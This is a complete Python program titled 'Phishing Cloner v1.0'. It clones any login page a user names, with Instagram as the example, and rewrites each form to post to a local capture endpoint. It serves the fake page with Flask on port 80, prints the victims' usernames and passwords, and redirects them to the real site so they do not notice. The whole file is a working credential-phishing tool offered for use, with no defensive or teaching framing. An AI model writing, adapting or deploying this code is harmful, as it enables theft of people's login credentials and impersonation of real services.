import requests
from bs4 import BeautifulSoup
from flask import Flask, request, render_template_string, redirect, url_for
import threading
import sys
import os

app = Flask(__name__)

# Global variable to store the cloned HTML
cloned_html = ""
target_url = ""

def get_site_content(url):
    """Fetches the HTML content of the target website."""
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(url, headers=headers)
        return response.text
    except Exception as e:
        print(f"[-] Error fetching {url}: {e}")
        return None

def modify_form(html_content, action_url):
    """Modifies the HTML to intercept form submissions."""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Find all forms in the HTML
    forms = soup.find_all('form')
    
    if not forms:
        print("[-] No forms found on the target site. Credentials might be sent via JavaScript.")
        return html_content
        
    for form in forms:
        # Change the form's action to point to our capture endpoint
        form['action'] = "/capture"
        
        # Ensure method is POST (most login forms are)
        form['method'] = "POST"
        
        # Add hidden fields if needed (optional, but good for some sites)
        # For simplicity, we just change the action. 
        # Note: Some sites use JavaScript to submit. This basic clone only catches standard HTML forms.
        
    return str(soup)

@app.route('/')
def index():
    """Serves the cloned page."""
    global cloned_html
    return cloned_html

@app.route('/capture', methods=['POST'])
def capture():
    """Receives the credentials from the target."""
    # Get the form data
    data = request.form
    
    # Extract common credential fields
    username = data.get('username') or data.get('login') or data.get('email') or data.get('user') or "Unknown"
    password = data.get('password') or "Unknown"
    
    # Print to terminal
    print("\n" + "="*40)
    print(f"[+] Credentials Captured!")
    print(f"[*] Username: {username}")
    print(f"[*] Password: {password}")
    print("="*40 + "\n")
    
    # Redirect the user back to the original site so they don't notice anything wrong
    # We use the original target_url here
    return redirect(target_url)

def start_server(port=80):
    """Starts the Flask server."""
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    print("[*] Phishing Cloner v1.0")
    target_url = input("[?] Enter the full URL of the site to clone (e.g., https://www.instagram.com): ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
        
    print(f"[*] Fetching content from {target_url}...")
    raw_html = get_site_content(target_url)
    
    if not raw_html:
        sys.exit("[-] Could not fetch the website. Check the URL.")
        
    print("[*] Modifying forms to capture credentials...")
    cloned_html = modify_form(raw_html, "/capture")
    
    print("[*] Starting server on http://<YOUR_IP>:80")
    print("[*] Waiting for victim to enter credentials...\n")
    
    # Start the Flask server in a separate thread so we can keep the main thread open if needed
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # Keep the main thread alive
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[-] Server stopped.")
